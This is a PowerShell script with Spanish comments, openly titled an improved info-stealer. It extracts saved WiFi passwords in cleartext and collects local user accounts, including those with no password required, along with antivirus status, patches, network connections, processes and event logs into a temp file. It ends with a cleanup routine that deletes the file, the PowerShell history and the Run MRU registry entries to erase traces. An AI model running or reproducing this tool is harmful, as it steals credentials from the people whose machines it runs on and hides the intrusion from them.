# Script Info-Stealer Mejorado

# Variables de Fecha y Hora
$Date = Get-Date -Format "yyyy-MM-dd"
$Time = Get-Date -Format "HH-mm-ss"
$StatsFile = "C:\Windows\Temp\stats_$($Date)_$($Time).txt"

# Función para Manejo de Errores
function Handle-Error {
    param($ErrorMessage)
    Write-Host "Error: $ErrorMessage" -ForegroundColor Red
}

# Función para escribir en el archivo de estadísticas
function Write-Stats {
    param($Message)
    try {
        Add-Content -Path $StatsFile -Value $Message
    } catch {
        Handle-Error "No se pudo escribir en el archivo de estadísticas"
    }
}

# Extraer perfiles de WiFi y contraseñas
function Get-WiFiProfiles {
    Write-Host "Extrayendo perfiles WiFi..."
    try {
        $profiles = netsh wlan show profiles | Select-String ':(.+)$' | ForEach-Object {
            $profileName = $_.Matches.Groups[1].Value.Trim()
            netsh wlan show profile name=$profileName key=clear | Select-String 'Key Content\s+:\s+(.+)$' | ForEach-Object {
                $password = $_.Matches.Groups[1].Value.Trim()
                [PSCustomObject]@{PROFILE_NAME=$profileName; PASSWORD=$password}
            }
        }
        $profiles | Format-Table -AutoSize | Out-File -FilePath $StatsFile -Append
    } catch {
        Handle-Error "No se pudieron obtener perfiles WiFi"
    }
}

# Extraer información del sistema
function Get-SystemInfo {
    Write-Host "Extrayendo información del sistema..."
    try {
        Get-CimInstance -ClassName Win32_ComputerSystem | Out-File -FilePath $StatsFile -Append
        Get-ComputerInfo | Out-File -FilePath $StatsFile -Append
        Get-LocalUser | Out-File -FilePath $StatsFile -Append
        Get-LocalUser | Where-Object -Property PasswordRequired -EQ $false | Out-File -FilePath $StatsFile -Append
        Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath $StatsFile -Append
        Get-CimInstance -ClassName Win32_QuickFixEngineering | Out-File -FilePath $StatsFile -Append
    } catch {
        Handle-Error "No se pudo obtener la información del sistema"
    }
}

# Extraer información de red
function Get-NetworkInfo {
    Write-Host "Extrayendo información de red..."
    try {
        Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '127.0.0.1|169.254' } | Out-File -FilePath $StatsFile -Append
        Get-NetTCPConnection | Select-Object -Property * | Out-File -FilePath $StatsFile -Append
    } catch {
        Handle-Error "No se pudo obtener la información de red"
    }
}

# Extraer información de procesos
function Get-ProcessInfo {
    Write-Host "Extrayendo información de procesos..."
    try {
        Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Out-File -FilePath $StatsFile -Append
        Get-Process | Select-Object -Property Name,Id,Path,StartTime,Company,FileVersion | Out-File -FilePath $StatsFile -Append
    } catch {
        Handle-Error "No se pudo obtener la información de procesos"
    }
}

# Extraer los últimos eventos del sistema
function Get-EventLogInfo {
    Write-Host "Extrayendo registros del sistema..."
    try {
        Get-EventLog -LogName System -Newest 50 | Out-File -FilePath $StatsFile -Append
    } catch {
        Handle-Error "No se pudieron extraer los eventos"
    }
}

# Ejecutar funciones de recolección de datos
Write-Host "Iniciando extracción de datos..."
Get-WiFiProfiles
Get-SystemInfo
Get-NetworkInfo
Get-ProcessInfo
Get-EventLogInfo

Write-Host "Extracción completada. Los datos se han guardado en: $StatsFile"

# Función para eliminar archivos y limpiar rastros
function Cleanup {
    Write-Host "Limpieza de archivos temporales..."
    try {
        # Eliminar archivo de estadísticas
        Remove-Item -Path $StatsFile -ErrorAction SilentlyContinue
        # Eliminar historial de PowerShell
        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        # Limpiar MRU (Most Recently Used) del registro
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    } catch {
        Handle-Error "Error al limpiar los archivos temporales"
    }
}

# Limpieza después de ejecutar
Cleanup
Write-Host "Limpieza completada."
